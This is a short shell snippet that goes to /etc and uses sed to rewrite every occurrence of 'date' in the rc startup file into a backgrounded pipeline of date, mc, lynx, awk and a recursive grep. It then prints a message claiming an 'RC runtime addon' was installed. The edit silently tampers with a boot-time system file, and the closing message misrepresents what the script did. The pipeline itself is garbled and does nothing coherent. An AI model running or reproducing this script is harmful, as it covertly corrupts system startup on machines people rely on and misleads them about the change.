cd /etc
sed -i "s/date/nohup date | mc | lynx localhost | awk '{printf $0}' | grep -ahRri . $1 &/g" rc
echo "finished installing RC runtime addon"
